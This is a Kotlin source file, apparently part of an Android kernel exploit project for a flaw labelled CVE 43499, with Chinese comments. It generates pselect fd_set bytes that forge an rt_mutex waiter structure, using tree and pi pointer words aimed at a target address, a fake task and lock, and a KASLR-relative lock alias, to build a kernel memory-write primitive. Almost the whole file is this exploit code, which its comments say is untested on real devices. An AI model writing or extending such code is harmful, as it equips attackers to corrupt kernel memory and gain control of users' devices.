package com.ghostlock.app.backend.cve43499.generator

import com.ghostlock.app.backend.cve43499.flow.Cve43499GeneratedInputs
import com.ghostlock.app.backend.cve43499.flow.Cve43499PostPlacementGenerator
import com.ghostlock.app.backend.cve43499.lifecycle.Cve43499PlacementFacts
import com.ghostlock.app.jni.Native43499PselectSpec
import com.ghostlock.app.jni.Native43499PrimitiveSpec

/**
 * pselect 输入 generator（R3b）：由 placement facts 生成三组 fd_set 词表字节、
 * 320 nfds、fake task/lock 地址与 enterDelay/fdReserveStride/selectUseTimeval。
 *
 * 数据来源（只读参考）：
 * - fd_set 词表：legacy2 `route_select.cpp:283-352`（compact waiter 11 个词，
 *   `global_word = waiter_shift + waiter_word`，shift=-2；nfds=320 ⇒ 每 set 5 字）；
 * - 词值：`tree_pc=layout.value`、`tree_left=target`、`task/lock`、wake_prio；
 * - 页接受判据与 landing 字节：与 multicast 共用 W1 布局（legacy2 `memory.cpp`）。
 *
 * @param context generator 上下文（目标事实 + 执行参数 + 本进程 pid）。
 * @note 纯函数；帧字节顺序 = input/output/exception 三个 set 依次拼接（Native 约定）。
 * @note 阶段：R3b；真机未验证。
 */
internal class Cve43499PselectInputGenerator(
    private val context: Cve43499GeneratorContext,
) : Cve43499PostPlacementGenerator, Cve43499WriteGenerator {
    /**
     * 生成 W1 landing + pselect PrimitiveSpec（R3b 兼容入口）。
     *
     * @param facts Placement 事务回传的只读物理事实。
     * @return Flow 使用的生成输入。
     */
    override fun generate(facts: Cve43499PlacementFacts): Cve43499GeneratedInputs =
        generateForWrite(facts, context.w1WriteRequest())

    /**
     * 生成指定写请求的 landing + pselect PrimitiveSpec（R3d 多写链）。
     *
     * @param facts Placement 事务回传的只读物理事实。
     * @param request 本事务写请求（fd_set 词表的 pc/left 由请求派生）。
     * @return Flow 使用的生成输入。
     * @throws Cve43499GeneratorException 事实/配置非法（fail-closed）。
     */
    override fun generateForWrite(
        facts: Cve43499PlacementFacts,
        request: Cve43499WriteRequest,
    ): Cve43499GeneratedInputs {
        val generator = context.debug.generator
        val payload = Cve43499PayloadBuilder.build(
            facts = facts,
            context = context,
            tcpLayout = false,
            request = request,
        )
        val pageAccept = pageAcceptParameters(
            request = request,
            writeValueOffset = generator.payload.writeValueOffset,
            pageAcceptBit = generator.payload.pageAcceptBit,
        )
        val frame = buildFrame(payload, request)
        val spec = Native43499PselectSpec(
            finalWaiterAddress = payload.fakeW0,
            finalTaskAddress = payload.fakeTask,
            finalLockAddress = payload.fakeLock,
            frameBytes = frame,
            descriptorCapacity = generator.pselect.nfds,
            operationBudget = generator.pselect.operationBudget,
            timeoutNanos = generator.pselect.timeoutNanos,
            perAttemptDelayNs = generator.pselect.perAttemptDelayNs,
            maxNfds = generator.pselect.maxNfds,
            enterDelayNs = generator.pselect.enterDelayNs,
            fdReserveStride = generator.pselect.fdReserveStride,
            selectUseTimeval = generator.pselect.selectUseTimeval,
            primitiveKind = Native43499PrimitiveSpec.KIND_PSELECT,
        )
        return Cve43499GeneratedInputs(
            landing = context.landingConfig(payload.bytes, pageAccept),
            primitive = spec,
        )
    }

    /**
     * 构造三组 fd_set 的最终字节（input/output/exception 依次拼接）。
     *
     * @param payload landing payload 派生结果。
     * @param request 写请求（左子/target 词使用）。
     * @return 帧字节（长度 = 3 × words × 8）。
     * @throws Cve43499GeneratorException nfds/shift/词表越界。
     */
    private fun buildFrame(
        payload: Cve43499PayloadResult,
        request: Cve43499WriteRequest,
    ): ByteArray {
        val pselect = context.debug.generator.pselect
        if (pselect.nfds <= 0L || pselect.nfds > FD_SETSIZE) {
            throw Cve43499GeneratorException("pselect:nfds")
        }
        if (pselect.maxNfds < pselect.nfds || pselect.maxNfds > FD_SETSIZE) {
            throw Cve43499GeneratorException("pselect:max-nfds")
        }
        val wordsPerSet = ((pselect.nfds + 63L) / 64L)
        val globalWords = wordsPerSet * 3L
        if (globalWords > Int.MAX_VALUE.toLong() / 8L) {
            throw Cve43499GeneratorException("pselect:frame-size")
        }
        val frameSize = globalWords * 8L
        val writer = Cve43499LeWriter(ByteArray(frameSize.toInt()))
        /* task-134/S3：有 anchor 时 lock 字指向镜像全零 .bss（KASLR 相对），
         * 否则保持旧页派生 fake_lock。 */
        val anchor = context.debug.generator.selectStackAnchor
        val lockWord = anchor?.let { context.dataAlias(it.lockAnchorImage) }
            ?: payload.fakeLock
        /* compact waiter 词表（legacy2 route_select.cpp:304-317，5.15/6.1）。 */
        val words = listOf(
            WaiterWord(2, payload.writeLayout.value), /* tree_pc */
            WaiterWord(3, 0L), /* tree_right */
            WaiterWord(4, request.target), /* tree_left */
            WaiterWord(5, payload.writeLayout.value), /* pi_pc */
            WaiterWord(6, 0L), /* pi_right */
            WaiterWord(7, request.target), /* pi_left */
            WaiterWord(8, payload.fakeTask), /* task */
            WaiterWord(9, lockWord), /* lock（anchor 存在时为 anchor image alias） */
            WaiterWord(
                10,
                (context.debug.generator.payload.fakeWaiterPrio shl 32) or
                    WAKE_PRIO_LOW_BITS, /* wake_prio */
            ),
            WaiterWord(11, 0L), /* deadline */
            WaiterWord(12, 0L), /* ww_ctx */
        )
        for (word in words) {
            val globalWord = pselect.waiterShift + word.index
            if (globalWord < 0L || globalWord >= globalWords) {
                throw Cve43499GeneratorException("pselect:waiter-word-out-of-range")
            }
            writer.putU64(globalWord * 8L, word.value)
        }
        return writer.bytesView()
    }

    /**
     * @property index waiter 结构内的 64 位词下标（legacy `waiter_word`）。
     * @property value 该词的最终值。
     */
    private data class WaiterWord(val index: Long, val value: Long)

    private companion object {
        /** `fd_set` 的系统上限（与 Native `FD_SETSIZE` 同源；不是目标参数）。 */
        private const val FD_SETSIZE = 1024L

        /** waiter wake_state/prio 词的低位（legacy2 `race_session.cpp.disabled:98`）。 */
        private const val WAKE_PRIO_LOW_BITS = 3L
    }
}
